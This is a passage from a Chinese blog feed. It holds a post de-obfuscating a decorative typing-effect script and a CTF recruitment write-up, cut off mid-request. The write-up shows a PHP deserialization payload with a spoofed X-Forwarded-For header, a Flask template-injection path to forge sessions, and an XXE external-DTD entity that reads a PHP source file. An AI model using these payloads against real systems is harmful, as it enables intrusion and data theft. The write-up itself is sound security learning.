this 绑定为 Array.prototype.slice（这个 this 指的是 “apply 作为谁的方法被调用” 中的 “谁” 而不是 apply 的第一个参数），从而通过直接调用绑定后的函数（包装函数）来达到目的，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice = <span class="built_in">Function</span>.prototype.apply.bind(<span class="built_in">Array</span>.prototype.slice)</span><br><span class="line">...</span><br><span class="line">slice(<span class="built_in">arguments</span>)</span><br></pre></td></tr></table></figure><p>这样就缩短了调用方法时所需的长前缀，写起来就能更愉快一些。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一段 Js 代码的解读与思考</title>
      <link href="/2019/12/11/JS-Inspection/"/>
      <url>/2019/12/11/JS-Inspection/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>最近逛别人博客的时候，偶然看到了下面这货：</p><blockquote><div id="yuren-content"></div></blockquote><p>立刻就被这个简约的小东西给吸引住了，于是对着它就是一发审查元素，想看看其具体的实现，在把主要的部分提取出来后得到如下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"binft"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> binft=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> d=<span class="built_in">document</span>.createDocumentFragment(),c=<span class="number">0</span>;a&gt;c;c++)&#123;<span class="keyword">var</span> b=<span class="built_in">document</span>.createElement(<span class="string">"span"</span>);b.textContent=<span class="built_in">String</span>.fromCharCode(<span class="number">94</span>*<span class="built_in">Math</span>.random()+<span class="number">33</span>);b.style.color=f[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*f.length)];d.appendChild(b)&#125;<span class="keyword">return</span> d&#125;<span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> d=h[a.skillI];a.step?a.step--:(a.step=k,a.prefixP&lt;b.length?(<span class="number">0</span>&lt;=a.prefixP&amp;&amp;(a.text+=b[a.prefixP]),a.prefixP++):<span class="string">"forward"</span>===a.direction?a.skillP&lt;d.length?(a.text+=d[a.skillP],a.skillP++):a.delay?a.delay--:(a.direction=<span class="string">"backward"</span>,</span></span><br><span class="line"><span class="javascript">a.delay=l):<span class="number">0</span>&lt;a.skillP?(a.text=a.text.slice(<span class="number">0</span>,<span class="number">-1</span>),a.skillP--):(a.skillI=(a.skillI+<span class="number">1</span>)%h.length,a.direction=<span class="string">"forward"</span>));e.textContent=a.text;e.appendChild(m(a.prefixP&lt;b.length?<span class="built_in">Math</span>.min(c,c+a.prefixP):<span class="built_in">Math</span>.min(c,d.length-a.skillP)));setTimeout(g,n)&#125;<span class="keyword">var</span> b=<span class="string">""</span>,h=<span class="string">"\u9752\u9752\u9675\u4e0a\u67cf\uff0c\u78ca\u78ca\u6da7\u4e2d\u77f3\u3002 \u4eba\u751f\u5929\u5730\u95f4\uff0c\u5ffd\u5982\u8fdc\u884c\u5ba2\u3002 \u6597\u9152\u76f8\u5a31\u4e50\uff0c\u804a\u539a\u4e0d\u4e3a\u8584\u3002 \u9a71\u8f66\u7b56\u9a7d\u9a6c\uff0c\u6e38\u620f\u5b9b\u4e0e\u6d1b\u3002 \u6d1b\u4e2d\u4f55\u90c1\u90c1\uff0c\u51a0\u5e26\u81ea\u76f8\u7d22\u3002 \u957f\u8862\u7f57\u5939\u5df7\uff0c\u738b\u4faf\u591a\u7b2c\u5b85\u3002 \u4e24\u5bab\u9065\u76f8\u671b\uff0c\u53cc\u9619\u767e\u4f59\u5c3a\u3002 \u6781\u5bb4\u5a31\u5fc3\u610f\uff0c\u621a\u621a\u4f55\u6240\u8feb\uff1f"</span>.split(<span class="string">" "</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">return</span> a+</span></span><br><span class="line"><span class="javascript"><span class="string">""</span>&#125;),l=<span class="number">2</span>,k=<span class="number">1</span>,c=<span class="number">5</span>,n=<span class="number">75</span>,f=<span class="string">"rgb(110,64,170) rgb(150,61,179) rgb(191,60,175) rgb(228,65,157) rgb(254,75,131) rgb(255,94,99) rgb(255,120,71) rgb(251,150,51) rgb(226,183,47) rgb(198,214,60) rgb(175,240,91) rgb(127,246,88) rgb(82,246,103) rgb(48,239,130) rgb(29,223,163) rgb(26,199,194) rgb(35,171,216) rgb(54,140,225) rgb(76,110,219) rgb(96,84,200)"</span>.split(<span class="string">" "</span>),a=&#123;<span class="attr">text</span>:<span class="string">""</span>,<span class="attr">prefixP</span>:-c,<span class="attr">skillI</span>:<span class="number">0</span>,<span class="attr">skillP</span>:<span class="number">0</span>,<span class="attr">direction</span>:<span class="string">"forward"</span>,<span class="attr">delay</span>:l,<span class="attr">step</span>:k&#125;;g()&#125;;binft(<span class="built_in">document</span>.getElementById(<span class="string">'binft'</span>));</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 js 的部分经历了压缩，随便找了个在线解压工具尝试格式化后，终于获得了一份勉强能看的代码。而由于最近刚刚了解了 js 混淆的含义与作用，这份代码又刚好经过了不太难的混淆处理，故准备拿它开刀，尝试自己分析一下。</p><h1 id="0x1-相关问题"><a href="#0x1-相关问题" class="headerlink" title="0x1 相关问题"></a>0x1 相关问题</h1><h2 id="0x10-恼人的条件表达式"><a href="#0x10-恼人的条件表达式" class="headerlink" title="0x10 恼人的条件表达式"></a>0x10 恼人的条件表达式</h2><p>首先比较麻烦的就是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.step ? a.step--:(a.step = k, a.prefixP &lt; b.length ? (<span class="number">0</span> &lt;= a.prefixP &amp;&amp; (a.text += b[a.prefixP]), a.prefixP++) : <span class="string">"forward"</span> === a.direction ? a.skillP &lt; d.length ? (a.text += d[a.skillP], a.skillP++) : a.delay ? a.delay--:(a.direction = <span class="string">"backward"</span>, a.delay = l) : <span class="number">0</span> &lt; a.skillP ? (a.text = a.text.slice(<span class="number">0</span>, <span class="number">-1</span>), a.skillP--) : (a.skillI = (a.skillI + <span class="number">1</span>) % h.length, a.direction = <span class="string">"forward"</span>))</span><br></pre></td></tr></table></figure><p>这一坨迷之表达式了，对我而言非常有必要将其转换成普通的 if-else 语句，于是尝试 STFW 后得到如下三只：</p><ul><li><a href="https://opengg.github.io/babel-plugin-transform-ternary-to-if-else/" target="_blank" rel="noopener">OpenGG 的 转换工具(会转成 IIFE)</a></li><li><a href="https://raybb.github.io/ternary-converter/" target="_blank" rel="noopener">raybb 的 转换工具(需要用空格分隔关键字)</a></li><li><a href="converter.website-dev.eu">website-dev.eu 的转换工具(需要科学上网，或手动换源)</a></li></ul><p>然而如上所述，三位前辈的工具都有着各自的问题，先抛开 IIFE 的可读性不说，后面两只并没有支持诸如  <code>1?(2?3:4,3?4:5):6</code> 这样的平行语句，因此并不能处理上面的表达式，考虑到未来可能还会有类似的需求，故以解决上述情况为主要目标，掏出 Python 一顿乱敲产出了如下脚本（TL;DR）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引号中输入想要处理的内容</span></span><br><span class="line">tmp = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预处理 删除所有空格 方便后面判断左右是否有括号</span></span><br><span class="line">tmp = tmp.replace(<span class="string">' '</span>, <span class="string">''</span>)</span><br><span class="line"><span class="comment"># 将一组语句在考虑括号的前提下以逗号再分组</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSplitContent</span><span class="params">(tmp)</span>:</span></span><br><span class="line">balance = <span class="number">0</span></span><br><span class="line">indexs = []</span><br><span class="line">words = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp)):</span><br><span class="line"><span class="keyword">if</span> tmp[i] == <span class="string">'('</span>:</span><br><span class="line">balance += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> tmp[i] == <span class="string">')'</span>:</span><br><span class="line">balance -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> tmp[i]==<span class="string">','</span> <span class="keyword">and</span> balance==<span class="number">0</span>:</span><br><span class="line">indexs.append(i)</span><br><span class="line"><span class="comment"># 手动切分 因为 str 是不可变对象 暂时没有好办法</span></span><br><span class="line">i = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> indexs:</span><br><span class="line">words.append(tmp[i+<span class="number">1</span>:j])</span><br><span class="line">i = j</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">words.append(tmp[i+<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得 tmp 中和 ? 匹配的 : 符号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIndex</span><span class="params">(tmp)</span>:</span></span><br><span class="line">balance = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp)):</span><br><span class="line"><span class="keyword">if</span> tmp[i] == <span class="string">'?'</span>:</span><br><span class="line">balance += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> tmp[i] == <span class="string">':'</span>:</span><br><span class="line">balance -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> balance == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(input, n=<span class="number">0</span>)</span>:</span></span><br><span class="line"><span class="keyword">if</span> input.startswith(<span class="string">'('</span>) <span class="keyword">and</span> input.endswith(<span class="string">')'</span>):</span><br><span class="line">input = input[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">tab = <span class="string">'  '</span>*n</span><br><span class="line">splitTmp = getSplitContent(input)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tmp <span class="keyword">in</span> splitTmp:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 没找到则说明当前语句不可再分</span></span><br><span class="line">left = tmp.find(<span class="string">'?'</span>)</span><br><span class="line"><span class="keyword">if</span> left == <span class="number">-1</span>:</span><br><span class="line">print(<span class="string">"%s%s;"</span>%(tab, tmp))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 没找到则说明条件表达式不完整</span></span><br><span class="line">right = getIndex(tmp)</span><br><span class="line"><span class="keyword">if</span> right == <span class="number">-1</span>:</span><br><span class="line">print(<span class="string">"Error"</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="comment"># 打印当前层的 if-else 语句并递归处理子句</span></span><br><span class="line">print(<span class="string">"%sif (%s) &#123;"</span>%(tab, tmp[:left]))</span><br><span class="line"></span><br><span class="line">fun(tmp[left+<span class="number">1</span>:right], n+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'%s&#125; else &#123;'</span>%tab)</span><br><span class="line"></span><br><span class="line">fun(tmp[right+<span class="number">1</span>:], n+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'%s&#125;'</span>%tab)</span><br><span class="line"></span><br><span class="line">fun(tmp)</span><br></pre></td></tr></table></figure><p>主要思路比较简单，就是以括号为基准挑选出可作为分隔符的逗号，并以此对语句进行分组后再递归处理，唯一比较坑的地方是 python 中 str 属于不可变对象，因此这里只好采用记录下标并手动拆分的办法= =</p><p>同时，受上面前辈的启发，觉得可以在博客里开个 <a href="/tools/">杂项</a> 的板块，里面放一些小脚本等与博客本身没什么关系的东西，这样既方便日后的使用，也可以作为一种练习，嗯，可喜可贺。</p><p>把上面的一坨表达式丢进脚本里，再用运行后的结果替换之，可以发现这个名为 <strong>g</strong> 的函数就是逻辑的主要部分了。</p><h2 id="0x11-setTimeout-以及-js-事件循环机制"><a href="#0x11-setTimeout-以及-js-事件循环机制" class="headerlink" title="0x11 setTimeout 以及 js 事件循环机制"></a>0x11 setTimeout 以及 js 事件循环机制</h2><p>结束替换的工作后，就可以开始读代码了。考虑到实际的效果，能够猜到代码里包含着类似循环的部分，可是尝试搜索 for 和 while 时都没有找到任何内容。在仔细阅读后，终于发现在上面转换出来的 g 函数里静静地躺着一只 <code>setTimeout(g, n)</code> ，想来它就是我们的目标了。</p><p>可是很奇怪，之前在 w某school 和 某鸟 中了解到该函数只是设置一个表达式在多少毫秒后执行（因为没有实际用过我一直以为是像 sleep 一样的东西），那么如果把它放在这个地方，为什么不会因为无限递归而爆栈呢？</p><p>继续 STFW 后，终于得到<a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">答案</a>，这里为了方便日后回忆以及防止链接挂掉，简单地总结一下：</p><ul><li><p>首先要明确的，是 js 本身是一个 <strong>单线程</strong> 的语言，但是为了更好地处理网页中日渐庞大的静态资源，其提供了 同步任务 和 异步任务 两种机制。在实际执行时，同步任务进入主线程，而异步任务进入 EventTable 并注册回调函数，在指定的事情完成后，EventTable 会将这个函数移入 EventQueue；当 js 的 monitoring process 进程发现主线程空栈后就会去 EventQueue 中读取对应的函数并执行，这个过程一直持续到所有的任务被完成。</p></li><li><p>而除了广义的 同步 与 异步，在精细定义下任务还可以被分成 宏任务(macro-task) 和 微任务(micro-task) ，前者包括整体代码，setTimeout，setInterval，后者包括 Promise，process.nextTick 等等；不同的任务在执行时会以这两种任务为基准进入对应的 EventQueue ，并交替运行直至所有任务被完成。</p></li><li><p>而 setTimeout 函数中用来表示时间的参数，实际上指的是经过多少毫秒后将任务从 EventTable 转移到宏任务的 EventQueue 中，所以影响实际时间的因素其实还挺多的，完全不是 w某school 和 某鸟 中说的那样= =</p></li></ul><p>据说这一点在前端的面试题中屡见不鲜，以后有时间可以找一找相关的内容。</p><p>回到正题，由于这里把函数调用放到了所有语句的最后，所以时间上基本没什么偏差；而之所以以这种方式实现，是因为 js 本事是单线程的语言，所以如果这里以普通循环来实现的话会让其他的任务卡住，看来 <strong>这里异步的递归就是循环</strong> 呀，嗯，学到了。</p><h2 id="0x12-createDocumentFragment-的含义"><a href="#0x12-createDocumentFragment-的含义" class="headerlink" title="0x12 createDocumentFragment 的含义"></a>0x12 createDocumentFragment 的含义</h2><p>从最终效果来看，这是一个不断更新文档元素的过程，通过查看代码可以发现，实际负责插入随机字符的是名为 m 的这个函数，注意到在其 for 循环中，有着名为 createDocumentFragment 的函数调用，这就又触及到我的盲区了，遂继续<a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/createDocumentFragment" target="_blank" rel="noopener">求助网络</a>，得知该函数可以很好地工作在频繁更新元素的环境下。</p><h1 id="0x2-结语"><a href="#0x2-结语" class="headerlink" title="0x2 结语"></a>0x2 结语</h1><p>做好上述准备后，就可以安心地读代码了。其本身并没有什么难度，在去掉了用来混淆的无关代码以及对变量和函数进行语义化后就得到了当前页面中使用的 js 代码了。有兴趣的朋友们可以看一下～</p><script>// 作为 web 坑的新人，非常渴望找到一个可以交流技术或可以一起合作写项目的个人或// 团体，如果您对此有兴趣的话，非常欢迎通过右侧的联系方式与我交流～    (()=>{        let div = document.querySelector('#yuren-content');        let sequences = ["一二三四五，上山打老虎。", "老虎没打到，打到小松鼠。"];        let colors = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"];        function getOneColor() {            return colors[Math.floor(Math.random()*colors.length)];        }        function getSomeChar(r) {            let n=document.createDocumentFragment();            for (let i=0; i<r; ++i) {                let l = document.createElement('span');                l.textContent = String.fromCharCode(33+94*Math.random());                l.style.color = getOneColor();                n.appendChild(l);            }            return n;        }        let tmp = "";        let index = 0;        let which = 0;        let delay = 2;        let stop = true;        let direction = "forward";        function run() {            let seq = sequences[which];            if (stop) {                stop = false;            } else {                stop = true;                if (direction === "forward") {                    if (index < seq.length) {                        tmp += seq[index];                        ++index;                    } else {                        if (delay) {                            --delay;                        } else {                            direction = 'backward';                            delay = 2;                        }                    }                } else {                    if (index > 0) {                        tmp = tmp.slice(0, -1);                        --index;                    } else {                        which = (which+1)%sequences.length;                        direction = 'forward';                    }                }            }            div.textContent = tmp;            div.appendChild(getSomeChar(Math.min(5, seq.length-index)));            setTimeout(run, 75);        }        run();    })();</script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NEXCTF 招新赛 WirteUP</title>
      <link href="/2019/11/20/NEXCTF-WriteUp/"/>
      <url>/2019/11/20/NEXCTF-WriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>本文是上个月学校 NEX 战队招新赛中部分题目的 WriteUP ，因为赛事从结果上来说还是很令人高兴的，所以一直都想单独写一篇博客来记录这些题目，但是因为学校的一堆事情+拖延症的问题，差不多过了1个月才着手做这件事…</p><h1 id="0x1-相关环境"><a href="#0x1-相关环境" class="headerlink" title="0x1 相关环境"></a>0x1 相关环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python v3.7.4</span><br><span class="line">requests v2.22.0</span><br><span class="line">Flask v1.1.1</span><br><span class="line">Binwalk v2.1.1</span><br><span class="line">dd</span><br></pre></td></tr></table></figure><h1 id="0x2-各WriteUP"><a href="#0x2-各WriteUP" class="headerlink" title="0x2 各WriteUP"></a>0x2 各WriteUP</h1><h2 id="0x20-Web-签到"><a href="#0x20-Web-签到" class="headerlink" title="0x20 Web 签到"></a>0x20 Web 签到</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ttt</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'get'</span>] === <span class="string">'1'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'post'</span>] === <span class="string">'1'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>] === <span class="string">'127.0.0.1'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           unserialize($_POST[<span class="string">'class'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码如上，分析知 ttt 类的析构函数会输出 flag 内容，而代码中存在 <a href="https://www.php.net/manual/zh/function.unserialize.php" target="_blank" rel="noopener">unserialize</a> 函数，故可知该代码存在<a href="https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/" target="_blank" rel="noopener">反序列化漏洞</a>。下面来构造 ttt 类的序列化内容，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ttt</span> </span>&#123;&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ttt);</span><br></pre></td></tr></table></figure><p>那么现在解决问题的关键就是构造满足三个 if 条件的请求，以使程序流程到达反序列化函数那里。get 和 post 都是常规的请求，这里可以了解一下 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For" target="_blank" rel="noopener">X-Forwarded-For</a> ，然后可通过 Python3+Requests 构造如下请求来获取  flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">'requests'</span>).post(<span class="string">'http://&lt;ip&gt;:&lt;port&gt;/?get=1'</span>, data=&#123;<span class="string">'post'</span>:<span class="string">'1'</span>,<span class="string">'class'</span>:<span class="string">'O:3:"ttt":0:&#123;&#125;'</span>&#125;, headers=&#123;<span class="string">'X-Forwarded-For'</span>:<span class="string">'127.0.0.1'</span>&#125;).content</span><br></pre></td></tr></table></figure><h2 id="0x21-Baby-Flask"><a href="#0x21-Baby-Flask" class="headerlink" title="0x21 Baby Flask"></a>0x21 Baby Flask</h2><p><a href="https://pan.baidu.com/s/1uAlyfJY63h05kG9LmGQQTg" target="_blank" rel="noopener">源码</a> 提取码: upiv</p><p>可以看到，路由 /admin 可以获取到 Flag ，该视图函数通过验证 session 中 admin 的值来返还不同的内容；而因为 Flask 是<a href="https://www.secpulse.com/archives/97707.html" target="_blank" rel="noopener">客户端session</a>的模式，故这个值可以人为修改。</p><p>那么解题的目标就变成了通过寻找注入点来获取 secretkey ，查看代码知调用 render_template_string 函数时第一个参数传递了 template.replace，将 模版中的 $remembered_name 替换成了 session 中 name 的值，通过查看 index.html 可知该占位符出现在 Info 模块和 Author 输入框的 value 属性中，故可通过合理控制 Author 中的值来实现注入。</p><p>而在 app.py 中，通过定义 safe_input 函数针对 post 过来的输入进行了过滤，查看代码可知输入中不能出现 ()[]_ 这几种字符，所以可以通过全局变量 config 来获取secretkey。</p><p>拿到key以后，通过构造 session ，并使用浏览器自带的开发者工具将原来的值替换掉即可通过访问 /admin 拿到 Flag。</p><h2 id="0x22-Baby-xxe"><a href="#0x22-Baby-xxe" class="headerlink" title="0x22 Baby xxe"></a>0x22 Baby xxe</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = $_POST[<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($xmlfile)) &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (stristr($xmlfile, <span class="string">"xml"</span>)) &#123;</span><br><span class="line">$xmlfile = str_ireplace(<span class="string">"&lt;!entity"</span>, <span class="string">"nonono"</span>, $xmlfile);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$xmlfile = <span class="string">'&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="string">&lt;!ENTITY all "'</span>.$xmlfile.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;all;&lt;/root&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT|LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line"><span class="keyword">echo</span> ($creds);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>提示信息：Flag 在 ./flag.php 中</strong></p><p>尝试直接访问 flag.php 发现内容为 flag{f4ke_fl4g} ，也就是假 Flag ；那么根据提示来分析，很有可能真正的 Flag 被写在 php 代码的注释中或是有 if 条件来限制，所以首要的目标是拿到 flag.php 的代码。</p><p>通过分析上面的代码，可以发现 else 中 xmlfile 被双引号扩住，所以不能通过写入 SYSTEM 关键字来达到 xxe 的效果，而 else if 中只要出现 xml 字样就会替换 entity 关键字，但没有进一步的过滤措施，故可以通过载入 dtd 的方式实现注入。</p><p><strong>题目本身是放在服务器上的，故想要访问自定义的 dtd 文件需要具备公网 ip 的设备，这里的复现因为在本地，就不做相关处理了</strong>。假设文件名为 tmp.dtd ，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;&gt;</span><br></pre></td></tr></table></figure><p>这里要注意的是，由于最后 php 解析的是 xml 内容，而 flag.php 代码中存在诸如 &lt;&gt; 的符号，会对解析造成干扰，故采用 php 伪协议将文件内容以 base64 进行编码。</p><p>然后通过 Python+Requests 发送如下 POST 请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span 